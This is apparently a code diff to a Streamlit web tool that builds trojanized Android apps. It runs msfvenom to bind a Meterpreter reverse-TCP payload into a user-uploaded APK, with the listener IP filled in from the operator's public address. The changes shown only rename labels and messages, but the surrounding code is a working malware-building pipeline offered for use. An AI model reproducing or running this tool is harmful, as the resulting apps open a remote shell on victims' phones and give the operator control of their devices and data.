@@ -19,7 +19,7 @@ def generate_payload(ip, port, output_file, apk_path):
     command = f"msfvenom -x {apk_path} -p android/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -o {output_file}.apk"
 
     progress_text = st.empty()
-    progress_text.warning("Building payload...")
+    progress_text.success("Building payload...")
 
     try:
         process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, universal_newlines=True)
@@ -37,13 +37,13 @@ def generate_payload(ip, port, output_file, apk_path):
             # Clean up the generated APK file
             os.remove(f"{output_file}.apk")
         else:
-            st.error("Error occurred while generating payload.")
+            st.error("Error occurred while generating binder.")
     except Exception as ex:
         st.error(f"An error occurred: {ex}")
     finally:
         progress_text.empty()
 
-st.title("Android Reverse TCP Payload Generator")
+st.title("Android Reverse TCP Payload Binder")
 
 public_ip = requests.get('https://api.ipify.org').text
 ip = st.text_input("Enter IP Address:", value=public_ip)
@@ -52,7 +52,7 @@ output_file = "payload"
 
 uploaded_file = st.file_uploader("Upload APK file to bind", type=["apk"])
 
-if st.button("Generate Payload") and uploaded_file is not None:
+if st.button("Bind Payload") and uploaded_file is not None:
     try:
         temp_file_path = "temp.apk"
         with open(temp_file_path, "wb") as f:
